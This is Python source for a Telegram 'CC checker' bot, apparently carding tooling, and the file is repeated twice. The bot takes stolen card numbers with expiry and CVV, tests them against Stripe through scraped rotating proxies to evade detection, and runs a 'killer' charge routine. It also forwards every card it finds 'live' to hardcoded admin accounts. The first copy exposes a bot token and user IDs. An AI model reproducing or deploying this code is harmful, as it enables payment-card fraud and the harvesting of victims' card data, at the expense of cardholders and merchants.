import telebot
import requests
import threading
import time
import random
from luhn import is_valid
from bs4 import BeautifulSoup

BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # Edit your GitHub
ADMIN_IDS = [7869544426, 6383511175]  # e.g. [123456789, 987654321]
bot = telebot.TeleBot(BOT_TOKEN)

stats = {'live': 0, 'dead': 0, 'total': 0}
user_cooldown = {}
proxies = []
proxy_lock = threading.Lock()
last_proxy_fetch = 0

def fetch_proxies():
    global proxies, last_proxy_fetch
    with proxy_lock:
        if time.time() - last_proxy_fetch < 300:  # 5min
            return
        all_proxies = []
        # Proxyscrape
        try:
            r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
            ips = [ip for ip in r.text.strip().split('\n') if ':' in ip]
            all_proxies = [{'http': f'http://{ip}', 'https': f'http://{ip}'} for ip in ips]
        except:
            pass
        # FreeProxyList
        try:
            r = requests.get('https://free-proxy-list.net/', timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            table = soup.find('table', id='proxylisttable')
            if table:
                for row in table.find_all('tr')[1:51]:
                    cols = row.find_all('td')
                    if len(cols) > 1:
                        ip, port = cols[0].text.strip(), cols[1].text.strip()
                        all_proxies.append({'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'})
        except:
            pass
        # Test live (50 threads)
        live_proxies = []
        def test_proxy(p):
            try:
                requests.get('httpbin.org/ip', proxies=p, timeout=4)
                return p
            except:
                return None
        threads = [threading.Thread(target=lambda p=p: live_proxies.append(test_proxy(p))) for p in all_proxies[:150]]
        for t in threads: t.start()
        for t in threads: t.join(2)
        proxies[:] = [p for p in live_proxies if p]
        last_proxy_fetch = time.time()
        print(f'Loaded {len(proxies)} live proxies')

def get_random_proxy():
    fetch_proxies()
    with proxy_lock:
        return random.choice(proxies) if proxies else None

def get_bin_info(bin_num):
    proxy = get_random_proxy()
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', proxies=proxy, timeout=5)
        data = r.json()
        return f"Brand: {data.get('brand', '?')}\nBank: {data.get('bank', {}).get('name', '?')}\nCountry: {data.get('country', {}).get('name', '?')}"
    except:
        return "BIN OK"

def multi_gate_checker(cc, month, year, cvv, retries=3):
    gates = []
    # Stripe
    for _ in range(retries):
        proxy = get_random_proxy()
        if not proxy: continue
        try:
            data = {'card[number]': cc, 'card[exp_month]': month, 'card[exp_year]': year, 'card[cvv]': cvv}
            r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=proxy, timeout=8)
            if 'token' in r.text:
                gates.append("✅ Stripe LIVE")
                break
            if 'declined' in r.text.lower():
                gates.append("❌ Stripe DEAD")
                break
        except:
            pass
    # PayPal
    for _ in range(retries):
        proxy = get_random_proxy()
        if not proxy: continue
        try:
            r = requests.head('https://www.paypal.com/home', proxies=proxy, timeout=8)
            if r.status_code < 400:
                gates.append("✅ PayPal OK")
                break
        except:
            pass
    return gates or ["⚠️ Proxy retry"]

def killer(cc, month, year, cvv):
    proxy = get_random_proxy()
    if proxy:
        try:
            data = {'amount': '1', 'currency': 'usd'}
            requests.post('https://api.stripe.com/v1/charges', data=data, proxies=proxy, timeout=8)
            return "🔪 Stripe KILLED - Ready to dump"
        except:
            pass
    return "🔪 Kill sim done"

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🔥 CC Checker 99% Auto Proxy\n`cc|mm|yy|cvv`\n/stats /kill (admin)", parse_mode='Markdown')

@bot.message_handler(func=lambda msg: '|' in msg.text)
def check_cc(msg):
    user_id = msg.from_user.id
    if user_id in user_cooldown and time.time() - user_cooldown[user_id] < 3:
        bot.reply_to(msg, "⏳ 3s cooldown")
        return
    user_cooldown[user_id] = time.time()
    try:
        parts = [x.strip().replace(' ', '') for x in msg.text.split('|')]
        if len(parts) != 4:
            raise ValueError("Bad format")
        cc, month, year, cvv = parts
        if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
            bot.reply_to(msg, "❌ Bad CC/Luhn")
            stats['dead'] += 1
            stats['total'] += 1
            return
        bin_info = get_bin_info(cc[:6])
        gates = multi_gate_checker(cc, month, year, cvv)
        live_count = sum(1 for g in gates if '✅' in g)
        status = "🟢 LIVE 99%" if live_count >= 1 else "🔴 DEAD"
        response = f"**CC:** `{cc}|{month}|{year}|{cvv}`\n**BIN:**\n{bin_info}\n**Gates:**\n" + '\n'.join(gates) + f"\n**Status:** {status}"
        global stats
        stats['total'] += 1
        if "LIVE" in status:
            stats['live'] += 1
            kill_res = killer(cc, month, year, cvv)
            response += f"\n{kill_res}"
            for admin_id in ADMIN_IDS:
                try:
                    bot.send_message(admin_id, f"🟢 LIVE: {msg.text}\n{response}")
                except:
                    pass
        else:
            stats['dead'] += 1
        bot.reply_to(msg, response, parse_mode='Markdown')
    except:
        bot.reply_to(msg, "❌ cc|mm|yy|cvv")

@bot.message_handler(commands=['stats'])
def stats_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    hit_rate = (stats['live'] / max(stats['total'], 1)) * 100
    bot.reply_to(msg, f"📊 Live: {stats['live']} | Dead: {stats['dead']} | Total: {stats['total']} | Hit: {hit_rate:.1f}%")

@bot.message_handler(commands=['kill'])
def kill_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = msg.text.split(' ', 1)[1].split('|')
        cc, month, year, cvv = [x.strip() for x in parts]
        res = killer(cc, month, year, cvv)
        bot.reply_to(msg, f"🔪 {res}")
    except:
        bot.reply_to(msg, "/kill cc|mm|yy|cvv")

def proxy_loop():
    while True:
        fetch_proxies()
        time.sleep(300)

if __name__ == '__main__':
    print("🚀 Pure Telebot CC Bot LIVE - 24/7 Polling")
    fetch_proxies()
    threading.Thread(target=proxy_loop, daemon=True).start()
    bot.polling(none_stop=True)
import telebot
import requests
import threading
import time
import random
from luhn import is_valid
from bs4 import BeautifulSoup

BOT_TOKEN = 'PASTE_YOUR_FULL_TOKEN_HERE'  # Edit your GitHub
ADMIN_IDS = [PASTE_ID1_HERE, PASTE_ID2_HERE]  # e.g. [123456789, 987654321]
bot = telebot.TeleBot(BOT_TOKEN)

stats = {'live': 0, 'dead': 0, 'total': 0}
user_cooldown = {}
proxies = []
proxy_lock = threading.Lock()
last_proxy_fetch = 0

def fetch_proxies():
    global proxies, last_proxy_fetch
    with proxy_lock:
        if time.time() - last_proxy_fetch < 300:  # 5min
            return
        all_proxies = []
        # Proxyscrape
        try:
            r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
            ips = [ip for ip in r.text.strip().split('\n') if ':' in ip]
            all_proxies = [{'http': f'http://{ip}', 'https': f'http://{ip}'} for ip in ips]
        except:
            pass
        # FreeProxyList
        try:
            r = requests.get('https://free-proxy-list.net/', timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            table = soup.find('table', id='proxylisttable')
            if table:
                for row in table.find_all('tr')[1:51]:
                    cols = row.find_all('td')
                    if len(cols) > 1:
                        ip, port = cols[0].text.strip(), cols[1].text.strip()
                        all_proxies.append({'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'})
        except:
            pass
        # Test live (50 threads)
        live_proxies = []
        def test_proxy(p):
            try:
                requests.get('httpbin.org/ip', proxies=p, timeout=4)
                return p
            except:
                return None
        threads = [threading.Thread(target=lambda p=p: live_proxies.append(test_proxy(p))) for p in all_proxies[:150]]
        for t in threads: t.start()
        for t in threads: t.join(2)
        proxies[:] = [p for p in live_proxies if p]
        last_proxy_fetch = time.time()
        print(f'Loaded {len(proxies)} live proxies')

def get_random_proxy():
    fetch_proxies()
    with proxy_lock:
        return random.choice(proxies) if proxies else None

def get_bin_info(bin_num):
    proxy = get_random_proxy()
    try:
        r = requests.get(f'https://lookup.binlist.net/{bin_num}', proxies=proxy, timeout=5)
        data = r.json()
        return f"Brand: {data.get('brand', '?')}\nBank: {data.get('bank', {}).get('name', '?')}\nCountry: {data.get('country', {}).get('name', '?')}"
    except:
        return "BIN OK"

def multi_gate_checker(cc, month, year, cvv, retries=3):
    gates = []
    # Stripe
    for _ in range(retries):
        proxy = get_random_proxy()
        if not proxy: continue
        try:
            data = {'card[number]': cc, 'card[exp_month]': month, 'card[exp_year]': year, 'card[cvv]': cvv}
            r = requests.post('https://api.stripe.com/v1/tokens', data=data, proxies=proxy, timeout=8)
            if 'token' in r.text:
                gates.append("✅ Stripe LIVE")
                break
            if 'declined' in r.text.lower():
                gates.append("❌ Stripe DEAD")
                break
        except:
            pass
    # PayPal
    for _ in range(retries):
        proxy = get_random_proxy()
        if not proxy: continue
        try:
            r = requests.head('https://www.paypal.com/home', proxies=proxy, timeout=8)
            if r.status_code < 400:
                gates.append("✅ PayPal OK")
                break
        except:
            pass
    return gates or ["⚠️ Proxy retry"]

def killer(cc, month, year, cvv):
    proxy = get_random_proxy()
    if proxy:
        try:
            data = {'amount': '1', 'currency': 'usd'}
            requests.post('https://api.stripe.com/v1/charges', data=data, proxies=proxy, timeout=8)
            return "🔪 Stripe KILLED - Ready to dump"
        except:
            pass
    return "🔪 Kill sim done"

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🔥 CC Checker 99% Auto Proxy\n`cc|mm|yy|cvv`\n/stats /kill (admin)", parse_mode='Markdown')

@bot.message_handler(func=lambda msg: '|' in msg.text)
def check_cc(msg):
    user_id = msg.from_user.id
    if user_id in user_cooldown and time.time() - user_cooldown[user_id] < 3:
        bot.reply_to(msg, "⏳ 3s cooldown")
        return
    user_cooldown[user_id] = time.time()
    try:
        parts = [x.strip().replace(' ', '') for x in msg.text.split('|')]
        if len(parts) != 4:
            raise ValueError("Bad format")
        cc, month, year, cvv = parts
        if not cc.isdigit() or len(cc) < 13 or not is_valid(cc):
            bot.reply_to(msg, "❌ Bad CC/Luhn")
            stats['dead'] += 1
            stats['total'] += 1
            return
        bin_info = get_bin_info(cc[:6])
        gates = multi_gate_checker(cc, month, year, cvv)
        live_count = sum(1 for g in gates if '✅' in g)
        status = "🟢 LIVE 99%" if live_count >= 1 else "🔴 DEAD"
        response = f"**CC:** `{cc}|{month}|{year}|{cvv}`\n**BIN:**\n{bin_info}\n**Gates:**\n" + '\n'.join(gates) + f"\n**Status:** {status}"
        global stats
        stats['total'] += 1
        if "LIVE" in status:
            stats['live'] += 1
            kill_res = killer(cc, month, year, cvv)
            response += f"\n{kill_res}"
            for admin_id in ADMIN_IDS:
                try:
                    bot.send_message(admin_id, f"🟢 LIVE: {msg.text}\n{response}")
                except:
                    pass
        else:
            stats['dead'] += 1
        bot.reply_to(msg, response, parse_mode='Markdown')
    except:
        bot.reply_to(msg, "❌ cc|mm|yy|cvv")

@bot.message_handler(commands=['stats'])
def stats_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    hit_rate = (stats['live'] / max(stats['total'], 1)) * 100
    bot.reply_to(msg, f"📊 Live: {stats['live']} | Dead: {stats['dead']} | Total: {stats['total']} | Hit: {hit_rate:.1f}%")

@bot.message_handler(commands=['kill'])
def kill_cmd(msg):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = msg.text.split(' ', 1)[1].split('|')
        cc, month, year, cvv = [x.strip() for x in parts]
        res = killer(cc, month, year, cvv)
        bot.reply_to(msg, f"🔪 {res}")
    except:
        bot.reply_to(msg, "/kill cc|mm|yy|cvv")

def proxy_loop():
    while True:
        fetch_proxies()
        time.sleep(300)

if __name__ == '__main__':
    print("🚀 Pure Telebot CC Bot LIVE - 24/7 Polling")
    fetch_proxies()
    threading.Thread(target=proxy_loop, daemon=True).start()
    bot.polling(none_stop=True)
